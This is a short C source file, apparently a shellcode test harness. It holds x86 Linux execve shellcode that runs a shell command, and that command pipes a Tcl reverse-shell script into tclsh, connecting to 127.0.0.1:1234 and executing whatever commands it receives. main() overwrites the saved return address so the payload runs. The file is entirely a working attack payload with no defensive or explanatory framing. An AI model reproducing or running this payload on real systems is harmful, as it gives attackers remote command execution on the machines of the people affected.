#ifdef X64
  #define WORD long
#else
  #define WORD int
#endif

char shellcode[] =
 "\x31\xc0\xb0\x0b\xbb\xd3\x8f\x9c\xff\xf7\xdb\x53\x89\xe3\x99\x52\xeb\x20\x8b\x34\x24\x46\x80\x3e\x23\x75\xfa\x88\x16\x53\x8d\x5c\x24\xf0\x53\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xcd\x80\xe8\xdb\xff\xff\xff"\
 "echo 'set s [socket 127.0.0.1 1234];while 1 { puts -nonewline $s \"$ \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"\
 "#";

int main()
{
  WORD *ret;
  ret = (WORD *) &ret + 2; /* Saved IP */
  (*ret) = (WORD) shellcode;
  return 0;
}
